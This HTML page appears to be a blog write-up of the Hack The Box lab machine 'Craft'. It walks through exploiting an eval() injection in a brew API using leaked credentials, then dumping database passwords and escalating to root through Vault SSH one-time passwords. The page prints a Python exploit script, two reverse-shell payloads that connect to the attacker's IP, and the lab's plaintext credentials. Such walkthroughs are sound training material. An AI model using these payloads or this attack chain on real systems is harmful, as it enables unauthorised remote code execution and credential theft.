@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Craft Hackthebox :: Vlaghe&#39;s Blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Changing hosts file By looking at the source code we can see gogs and api subdomains
+So I just modified the /etc/hosts to the following in order to access them.
+10.10.10.110 craft.htb gogs.craft.htb api.craft.htb Gogs page By a simple Google search we find out that Gogs is a somewhat widely used git service.
+Exploring the Craft repo we quickly find that there was an issue and a &amp;ldquo;fix&amp;rdquo; was implemented: By simply looking at the code we can easily identify where the vulnerability is." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://vlaghe.github.io/writeups/htb/craft/" />
+
+
+
+
+<link rel="stylesheet" href="https://vlaghe.github.io/assets/style.css">
+
+  <link rel="stylesheet" href="https://vlaghe.github.io/assets/green.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon" href="https://vlaghe.github.io/img/apple-touch-icon-192x192.png">
+
+  <link rel="shortcut icon" href="https://vlaghe.github.io/img/favicon/green.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Craft Hackthebox">
+<meta property="og:description" content="Changing hosts file By looking at the source code we can see gogs and api subdomains
+So I just modified the /etc/hosts to the following in order to access them.
+10.10.10.110 craft.htb gogs.craft.htb api.craft.htb Gogs page By a simple Google search we find out that Gogs is a somewhat widely used git service.
+Exploring the Craft repo we quickly find that there was an issue and a &amp;ldquo;fix&amp;rdquo; was implemented: By simply looking at the code we can easily identify where the vulnerability is." />
+<meta property="og:url" content="https://vlaghe.github.io/writeups/htb/craft/" />
+<meta property="og:site_name" content="Vlaghe&#39;s Blog" />
+
+  
+    <meta property="og:image" content="https://vlaghe.github.io/img/favicon/green.png">
+  
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2020-02-03 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Blog
+  </div>
+</a>
+
+    </div>
+    
+      <div class="menu-trigger">menu</div>
+    
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/notes">Notes</a></li>
+        
+      
+        
+          <li><a href="/writeups">Writeups</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/notes">Notes</a></li>
+      
+    
+      
+        <li><a href="/writeups">Writeups</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://vlaghe.github.io/writeups/htb/craft/">Craft Hackthebox</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2020-02-03
+        
+      </span>
+    
+    
+    
+  </div>
+
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h2 id="changing-hosts-file">Changing hosts file<a href="#changing-hosts-file" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>By looking at the source code we can see gogs and api subdomains</p>
+<p>So I just modified the  /etc/hosts to the following in order to access them.</p>
+<pre tabindex="0"><code>10.10.10.110    craft.htb gogs.craft.htb api.craft.htb
+</code></pre><h2 id="gogs-page">Gogs page<a href="#gogs-page" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p><img src="https://i.imgur.com/wDN37yi.png" alt=""></p>
+<p>By a simple Google search we find out that <a href="https://gogs.io/">Gogs</a> is a somewhat widely used git service.</p>
+<p>Exploring the Craft repo we quickly find that there was an issue and a &ldquo;fix&rdquo; was implemented:
+<img src="https://i.imgur.com/eAIzGds.png" alt=""></p>
+<p>By simply looking at the code we can easily identify where the vulnerability is. That is, passing user defined input directly into the eval function.</p>
+<p>We can also see that an API is used in the test file, so let&rsquo;s take a look at it as well.</p>
+<h2 id="api-page">API page<a href="#api-page" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>We are presented with this once the page loads:
+<img src="https://i.imgur.com/4cdaJZf.png" alt=""></p>
+<p>So as you can see we can login ( therefore getting a token ), check the validity of the token and delete,update,create,get brews. However we can&rsquo;t interact with it since we don&rsquo;t have any credentials in order to get a token&hellip;</p>
+<p>But wait, let&rsquo;s take a closer look at those 2 commits from before.</p>
+<p><img src="https://i.imgur.com/LjZ4X8U.png" alt=""></p>
+<p>OH, there you go, credentials found in the source code. Very bad practice indeed :))</p>
+<h1 id="exploiting-eval">Exploiting eval<a href="#exploiting-eval" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Now that we have the credentials needed to get a token, we need to think of a way to exploit the eval function. Wel&hellip; that&rsquo;s easy we just need to do this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> json
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> urllib3
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>urllib3<span style="color:#f92672">.</span>disable_warnings()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;https://api.craft.htb/api/&#34;</span>
+</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>get(url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;auth/login&#34;</span>, auth<span style="color:#f92672">=</span>(<span style="color:#e6db74">&#39;dinesh&#39;</span>, <span style="color:#e6db74">&#39;4aUh0A8PbVJxgd&#39;</span>), verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>token <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>loads(r<span style="color:#f92672">.</span>text)[<span style="color:#e6db74">&#39;token&#39;</span>]
+</span></span><span style="display:flex;"><span>print(token)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;abv&#34;</span>       : <span style="color:#e6db74">&#34;__import__(&#39;os&#39;).system(&#39;bash -i &gt;&amp; /dev/tcp/10.10.15.136/7070 0&gt;&amp;1&#39;)#&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;name&#34;</span>      : <span style="color:#e6db74">&#34;test&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;brewer&#34;</span>    : <span style="color:#e6db74">&#34;test&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;style&#34;</span>     : <span style="color:#e6db74">&#34;test&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>dumps(data)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>headers <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;X-Craft-API-Token&#39;</span>: token,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;Content-Type&#39;</span>: <span style="color:#e6db74">&#39;application/json&#39;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>post(url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;brew/&#34;</span>, headers<span style="color:#f92672">=</span>headers, data<span style="color:#f92672">=</span>data)
+</span></span><span style="display:flex;"><span>print(r<span style="color:#f92672">.</span>text)
+</span></span></code></pre></div><p>And start our listener:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">7070</span>
+</span></span></code></pre></div><p>Execute it and&hellip; Nothing. But it sohuld work right?</p>
+<p>Well that&rsquo;s what I thought in the first place as well, but after a lot of thinking, poking and coffe I found out that I was pretty restricted, so I said fuck it. And build the payload from scratch with the things I knew would work.</p>
+<p>Finally I&rsquo;ve ended up with this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>eval(compile(<span style="color:#e6db74">&#34;&#34;&#34;for x in range(1):</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> import socket,subprocess, os</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> s.connect((&#34;10.10.15.200&#34;, 7070))</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> os.dup2(s.fileno(),0)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> os.dup2(s.fileno(),1)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> os.dup2(s.fileno(),2)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> import pty</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74"> pty.spawn(&#34;/bin/sh&#34;)&#34;&#34;&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>,<span style="color:#e6db74">&#34;single&#34;</span>))
+</span></span></code></pre></div><p>After running the same script again, but with this payload I&rsquo;ve got a shell.  Hooray!!</p>
+<h1 id="escaping-the-jail">Escaping the jail<a href="#escaping-the-jail" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>I run <code>whoami</code> and I&rsquo;m root. Uhmmm&hellip;. That&rsquo;s pretty strange, but ok let&rsquo;s take the root.txt</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat: /root/root.txt: No such file or directory
+</span></span></code></pre></div><p>At this point I was confused, I thought that I gained access to a box that I wasn&rsquo;t supposed to, but that couldn&rsquo;t happen. Thus, I took a deeper look and found out that I was in a jail. However, I was having access to a file that I was previously interested in, but couldn&rsquo;t find it in the gogs page. That file being <em><code>settings.py</code></em></p>
+<p>So I just saw it in the directory I was currently in and took a look at it:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Flask settings</span>
+</span></span><span style="display:flex;"><span>FLASK_SERVER_NAME <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;api.craft.htb&#39;</span>
+</span></span><span style="display:flex;"><span>FLASK_DEBUG <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>  <span style="color:#75715e"># Do not use debug mode in production</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Flask-Restplus settings</span>
+</span></span><span style="display:flex;"><span>RESTPLUS_SWAGGER_UI_DOC_EXPANSION <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;list&#39;</span>
+</span></span><span style="display:flex;"><span>RESTPLUS_VALIDATE <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>RESTPLUS_MASK_SWAGGER <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>RESTPLUS_ERROR_404_HELP <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>CRAFT_API_SECRET <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;hz66OCkDtv8G6D&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># database</span>
+</span></span><span style="display:flex;"><span>MYSQL_DATABASE_USER <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;craft&#39;</span>
+</span></span><span style="display:flex;"><span>MYSQL_DATABASE_PASSWORD <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;qLGockJ6G2J75O&#39;</span>
+</span></span><span style="display:flex;"><span>MYSQL_DATABASE_DB <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;craft&#39;</span>
+</span></span><span style="display:flex;"><span>MYSQL_DATABASE_HOST <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;db&#39;</span>
+</span></span><span style="display:flex;"><span>SQLALCHEMY_TRACK_MODIFICATIONS <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span></code></pre></div><p>Another credentials, ok&hellip; but what can we do with them? Well, he is using them to connect to the db so let&rsquo;s do the same:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> pymysql
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> craft_api <span style="color:#f92672">import</span> settings
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># test connection to mysql database</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>connection <span style="color:#f92672">=</span> pymysql<span style="color:#f92672">.</span>connect(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;db&#39;</span>,
+</span></span><span style="display:flex;"><span>                             user<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;craft&#39;</span>,
+</span></span><span style="display:flex;"><span>                             password<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;qLGockJ6G2J75O&#39;</span>,
+</span></span><span style="display:flex;"><span>                             db<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;craft&#39;</span>,
+</span></span><span style="display:flex;"><span>                             cursorclass<span style="color:#f92672">=</span>pymysql<span style="color:#f92672">.</span>cursors<span style="color:#f92672">.</span>DictCursor)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> connection<span style="color:#f92672">.</span>cursor() <span style="color:#66d9ef">as</span> cursor:
+</span></span><span style="display:flex;"><span>        sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;select * from users&#34;</span>
+</span></span><span style="display:flex;"><span>        cursor<span style="color:#f92672">.</span>execute(sql)
+</span></span><span style="display:flex;"><span>        result <span style="color:#f92672">=</span> cursor<span style="color:#f92672">.</span>fetchall()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(result)):
+</span></span><span style="display:flex;"><span>            print(result[i])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">finally</span>:
+</span></span><span style="display:flex;"><span>    connection<span style="color:#f92672">.</span>close()
+</span></span></code></pre></div><p>And we get:</p>
+<pre tabindex="0"><code>{&#39;id&#39;: 1, &#39;username&#39;: &#39;dinesh&#39;, &#39;password&#39;: &#39;4aUh0A8PbVJxgd&#39;}
+{&#39;id&#39;: 4, &#39;username&#39;: &#39;ebachman&#39;, &#39;password&#39;: &#39;llJ77D8QFkLPQB&#39;}
+{&#39;id&#39;: 5, &#39;username&#39;: &#39;gilfoyle&#39;, &#39;password&#39;: &#39;ZEU3N8WNM2rh4T&#39;}
+</code></pre><p>Nice we&rsquo;ve now got the credentials for every user.
+Now what?</p>
+<p>At this point I thought to SSH with the found credentials, but it didn&rsquo;t work. So after getting into some really deep rabbit holes I&rsquo;ve decided to try to connect to the Gogs page with the new secrets as a last hope.</p>
+<p>And I&rsquo;ve got in with the gilfoyle user, prompted with this:
+<img src="https://i.imgur.com/Zwo1dtQ.png" alt=""></p>
+<p><strong>Note: Don&rsquo;t overcomplicate things, work with what you have and exhaust every possibility before moving on</strong></p>
+<p>I&rsquo;ve instantly looked at the <code>.ssh</code> folder and found the private key and therefore got user.</p>
+<h1 id="getting-root">Getting root<a href="#getting-root" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Once I&rsquo;ve got user I immediatly went back to the new repo to have a deeper look into it, since I learned my lesson from the previous incident.</p>
+<p>After looking through almost everything, the <code>vault/secrets.sh</code> popped as the most interesting to have a look at:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e"># set up vault secrets backend</span>
+</span></span><span style="display:flex;"><span>vault secrets enable ssh
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>vault write ssh/roles/root_otp <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>        key_type<span style="color:#f92672">=</span>otp <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>        default_user<span style="color:#f92672">=</span>root <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>        cidr_list<span style="color:#f92672">=</span>0.0.0.0/0
+</span></span></code></pre></div><p>With the help from Google I&rsquo;ve found <a href="https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html">this</a>. I&rsquo;ve just followed the article:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>vault write ssh/creds/otp_key_role ip<span style="color:#f92672">=</span>10.10.10.110
+</span></span></code></pre></div><p>Got the otp and used it to connect through SSH, since root was allowed to login.</p>
+
+      </div></div>
+
+  
+
+  
+  
+
+  
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://vlaghe.github.io/assets/main.js"></script>
+<script src="https://vlaghe.github.io/assets/prism.js"></script>
+
+
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
